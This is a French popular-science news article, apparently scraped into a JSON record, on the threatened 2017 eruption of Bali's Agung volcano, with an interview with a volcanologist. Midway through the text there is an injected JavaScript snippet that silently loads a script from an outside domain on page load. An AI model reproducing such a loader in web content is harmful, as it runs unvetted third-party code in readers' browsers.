{"title": "À Bali, le volcan Agung menace d'entrer en éruption", "newspaper": "Futura Sciences", "author": "Laurent Sacco", "date_publi": "27/09/2017", "content": "Plus de 57.000 personnes ont été évacuées dans un rayon d'environ 12 km autour de l'Agung, un volcan de l'île de Bali, en Indonésie, qui donne des signes d'éruption imminente. Sa dernière phase éruptive, il y a plus de cinquante ans, avait provoqué la mort d'environ 1.500 personnes. Futura a demandé au volcanologue Jacques-Marie Bardintzeff quelques explications sur la dangerosité de ce volcan. Ce qu'il faut retenir Les volcans indonésiens fertilisent les sols avec leurs éruptions explosives. Mais, parfois, ils peuvent aussi prendre de nombreuses vies, comme lors des éruptions de l'Agung, sur l'île de Bali, en 1963. Depuis août 2017, ce volcan donne des signes de reprise d'activité et, depuis peu, la multiplication de petits séismes sous l'édifice volcanique a conduit les autorités indonésiennes à évacuer plus de 57.000 personnes dans un rayon de 12 km autour du volcan. Il reste impossible de prédire l'occurrence réelle d'une éruption, ni même la date à laquelle celle-ci pourrait se produire. Toutefois, les populations évacuées devraient être à l'abri des nuées ardentes et des lahars. Interview : quels sont les dangers du volcanisme ?                       La vie près des volcans n’est pas toujours paisible. En cas d’éruption la population est soumise à divers dangers dont certains peuvent être fatals. Futura-Sciences a rencontré Jacques-Marie Bardintzeff, docteur en volcanologie, pour qu’il nous parle de ces menaces.                                       L'île de Bali est un paradis sur  Terre . Très prisée des touristes, elle fait partie des Petites îles de la Sonde, un  archipel  de l'Asie du Sud-Est partagé entre l'Indonésie et le Timor oriental. Elle est donc membre de la fameuse  ceinture de feu  du Pacifique, où se trouvent concentrés volcans et  foyers  de  séismes , ce qui intriguait les géologues il y a plus d'un demi-siècle. Nous savons maintenant qu'il s'agit simplement de bordures de  plaques tectoniques , où des phénomènes de  subduction  se produisent. Ces derniers donnent naissance à des  arcs volcaniques  insulaires quand deux plaques océaniques sont concernées, ce qui est le cas des îles de la Sonde (ces phénomènes de subduction donnent par ailleurs naissance à des arcs volcaniques continentaux quand une plaque océanique passe sous une plaque continentale, comme c'est le cas avec les volcans andins tel le  Cotopaxi ). De somptueuses images de Bali. L'île est vue du sommet du volcan Agung, à l'aide d'un drone. © Jiří Hruška Des volcans fascinants mais dangereux On trouve environ 150 volcans en Indonésie. Cette région détient les records du monde en ce qui concerne la puissance des explosions volcaniques (il suffit de penser à celle du  supervolcan Toba ) et des séismes (on se souvient du  tsunami  causé en 2004). Les  magmas  qui alimentent ces volcans sont le produit de la  fusion  partielle du  manteau , mais en liaison avec la présence d'une plaque océanique subductée qui contient des minéraux hydratés. Cette eau modifie le point de fusion des roches et, au final, on obtient en surface des  laves  très visqueuses, où la puissance des  gaz  s'accumule, comme les  andésites  et les  rhyolites , qui génèrent un  volcanisme  explosif avec des éruptions  péléennes  et de type  plinien . Ces volcans sont donc dangereux car ces explosions s'accompagnent de  nuées ardentes  et de  coulées pyroclastiques  ainsi que de panaches de cendres qui peuvent perturber la circulation aérienne.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Mais, comme ces cendres sont très fertiles et qu'elles permettent plusieurs récoltes de riz chaque année en Indonésie, d'importantes populations vivent sur les flancs de ces bombes à retardement. Elles rechignent à les quitter, même en cas d'alerte, car elles possèdent également du bétail. Les autorités indonésiennes font donc ce qu'elles peuvent depuis des décennies pour étudier et surveiller ces volcans. C'est d'ailleurs pour cette raison que de nombreux volcanologues les ont auscultés, comme Maurice et  Katia Krafft  au début de leur carrière, mais aussi  Haroun Tazieff . Des images de la dernière éruption de l'Agung, en 1963. Pour obtenir une traduction en français assez fidèle, cliquez sur le rectangle blanc en bas à droite. Les sous-titres en anglais devraient alors apparaître. Cliquez ensuite sur l'écrou à droite du rectangle, puis sur « Sous-titres » et enfin sur « Traduire automatiquement ». Choisissez « Français ». © British Pathé L'Agung, un stratovolcan sacré Or, justement, les volcanologues indonésiens ont donné l'alerte depuis quelque temps en ce qui concerne le  volcan  Agung, sur l'île de Bali. Il s'agit d'un  stratovolcan  de plus de 3.000 m de haut. Il est considéré comme une montagne sacrée par les hindous de Bali, mais il est fréquemment escaladé par les touristes, qui n'hésitent pas à se jeter en  parapente  du haut de son sommet. Sa dernière phase  éruptive  s'est déroulée de 1963 à 1964 : plus de 1.500 personnes ont alors été tuées du fait des nuées ardentes ou des  torrents  de boues typiques de l'Indonésie, les fameux  lahars . Craignant une nouvelle catastrophe, les autorités indonésiennes ont fait évacuer plus de 57.000 personnes vivant dans un rayon d'environ 12 km autour de l'Agung. Comme le danger d'une éruption imminente semble sérieux, Futura s'est tourné vers le célèbre volcanologue  Jacques-Marie Bardintzeff , chroniqueur régulier du  blog Volcanmania , mis à sa disposition par Futura, pour qu'il nous donne son avis. Le bord du cratère de l'Agung, qui est un volcan sacré pour les hindous de Bali. © Tropical studio, Fotolia                               Futura : Le volcan Agung surgit en ce moment sur le devant de la scène. Il faut dire qu'il se trouve à Bali, qui est fréquentée par des touristes du monde entier. Mais a-t-on raison d'être inquiet ? Jacques-Marie Bardintzeff :  En ce qui concerne les populations qui vivent autour du volcan, absolument, et les autorités indonésiennes ont eu 100 % raison de les faire évacuer, même si cela pose de nombreux problèmes. Tous les voyants sont au rouge, à tel point que, vendredi dernier, j'étais prêt à parier que l'Agung entrerait en éruption dans les 48 heures tout au plus. En 1963, l'activité éruptive avait atteint un indice d'explosivité volcanique de 5 sur une échelle qui en compte 8, c'est-à-dire l'indice attribué à l'éruption du  mont Saint Helens  en 1980, ou à celle du Vésuve en 79. Le panache de cendres avait atteint la  stratosphère , ce qui fait que les produits de l'éruption pouvaient être dispersés sur une large région. Ils ont même atteint Jakarta, à presque 1.000 km de distance. Peut-on espérer prévoir l'éruption ? Jacques-Marie Bardintzeff :  Cela semble peu probable. Il est même possible qu'on en reste là pendant longtemps. Nous savons que le magma bouge sous l'Agung et qu'il se rapproche de la surface en cherchant son chemin tout en fracturant les roches, ce qui génère des petits séismes que l'on peut même remarquer en surface. Mais nous ne savons pas précisément encore à quelle profondeur se trouve ce magma, et il pourrait stopper sa montée. L'éruption pourrait tout aussi bien se produire dans quelques heures, dans quelques jours ou quelques semaines, voire pas du tout. En 1984, le volcan Rabaul, situé sur l'île de Nouvelle-Bretagne, en Papouasie-Nouvelle-Guinée, était agité de crises sismiques similaires à celles que nous observons sur l'Agung aujourd'hui... et il n'a fait éruption qu'en 1994. Pendant une décennie, il a ainsi fait des poussées volcaniques inquiétantes à répétition. Si ce scénario se produit également avec l'Agung, ce sera très difficile de gérer au mieux la population. Peut-on au moins prévoir les risques associés à une nouvelle éruption ? Jacques-Marie Bardintzeff :  On peut le penser. L'éruption de 1963 a été plutôt bien suivie à l'époque et on en parlait encore au moment où je faisais ma thèse au début des années 1980 car c'était une éruption de référence. On pense donc connaître les couloirs possibles que peuvent emprunter les nuées ardentes, et c'est pourquoi il a été possible de délimiter une zone de sécurité d'environ 12 km de rayon. On ne devrait pas avoir de problème avec les lahars non plus. Il est vrai que ceux de l' éruption du Nevado del Ruiz  ont atteint la ville d'Armero, en Colombie, pourtant située à 48 km du volcan, en 1985. Mais l'eau provenait d'un lac dans le  glacier  couvrant le volcan, une situation qui n'est évidemment pas comparable à celle de l'Agung. Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest À voir aussi :  volcan en eruption en direct  |  bali kyoto  |  accords de bali  |  lezard bali  |  rizieres bali  |  araignee bali  |  menace meteorite  |  animaux menace  |  menace win32 malware-gen", "theme": "planete"}